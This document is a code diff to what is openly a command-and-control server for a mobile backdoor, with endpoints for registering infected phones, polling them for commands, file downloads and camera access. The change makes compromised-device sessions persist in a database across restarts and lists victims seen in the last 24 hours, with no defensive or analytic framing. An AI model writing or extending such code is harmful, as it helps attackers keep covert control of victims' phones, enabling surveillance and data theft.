@@ -932,6 +932,9 @@ def c2_file_download_response():
 
 # ===== MOBILE BACKDOOR ENDPOINTS =====
 
+# Import database for persistence
+import database as db
+
 # Global Mobile State
 MOBILE_SESSIONS = {}
 MOBILE_COMMANDS = {}
@@ -945,6 +948,10 @@ def mobile_register():
     uid = data.get('uid')
     info = data.get('info', {})
     
+    # Save to DATABASE (PERSISTENT - survives restart!)
+    db.save_mobile_session(uid, info, request.remote_addr)
+    
+    # Also keep in memory for current session
     MOBILE_SESSIONS[uid] = {
         'last_seen': datetime.now().isoformat(),
         'info': info,
@@ -974,6 +981,9 @@ def mobile_poll():
     """Mobile client polls for commands"""
     data = request.json
     uid = data.get('uid')
+    
+    # Update last seen in DATABASE
+    db.update_mobile_last_seen(uid)
     
     if uid in MOBILE_SESSIONS:
         MOBILE_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
@@ -1043,23 +1053,34 @@ def mobile_camera():
 
 @app.route('/api/mobile/clients', methods=['GET'])
 def mobile_clients():
-    """Get list of connected mobile clients"""
+    """Get list of connected mobile clients - LOADS FROM DATABASE!"""
     clients = []
     now = datetime.now()
     
+    # Load ALL sessions from database (PERSISTENT)
+    all_sessions = db.get_all_mobile_sessions()
+    
+    # Merge with in-memory sessions
+    for uid, db_session in all_sessions.items():
+        # Update in-memory cache
+        if uid not in MOBILE_SESSIONS:
+            MOBILE_SESSIONS[uid] = db_session
+    
+    # Now check which are active
     for uid, session in MOBILE_SESSIONS.items():
         try:
             last_seen = datetime.fromisoformat(session['last_seen'])
             seconds_ago = (now - last_seen).total_seconds()
             
-            # Consider active if seen in last 60 seconds
-            if seconds_ago < 60:
+            # Show all sessions from last 24 hours (not just 60 seconds)
+            if seconds_ago < 86400:  # 24 hours
                 clients.append({
                     'uid': uid,
                     'info': session['info'],
                     'ip': session['ip'],
                     'last_seen': session['last_seen'],
-                    'seconds_ago': int(seconds_ago)
+                    'seconds_ago': int(seconds_ago),
+                    'status': 'online' if seconds_ago < 60 else 'offline'
                 })
         except:
             pass
